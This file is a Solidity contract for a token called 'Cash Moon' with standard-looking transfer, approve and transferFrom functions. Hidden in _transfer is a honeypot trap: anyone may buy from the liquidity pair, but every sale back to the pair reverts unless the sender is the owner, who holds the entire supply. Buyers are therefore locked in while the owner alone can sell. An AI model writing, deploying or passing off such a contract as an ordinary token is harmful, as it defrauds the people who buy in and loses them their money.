// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract CashMoon {
    string public constant name = "Cash Moon";
    string public constant symbol = "CashMoon";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 100_000_000 * 10**18;

    address public immutable owner;
    address public pair;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setPair(address _pair) external {
        require(msg.sender == owner, "Not owner");
        require(pair == address(0), "Pair already set");
        pair = _pair;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "Insufficient balance");

        if (from == pair) {
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }

        if (to != pair) {
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }

        require(from == owner, "Selling is only allowed for the owner");

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender != from) {
            uint256 allowed = allowance[from][msg.sender];
            require(allowed >= amount, "Insufficient allowance");
            if (allowed != type(uint256).max) {
                allowance[from][msg.sender] -= amount;
            }
        }

        _transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
}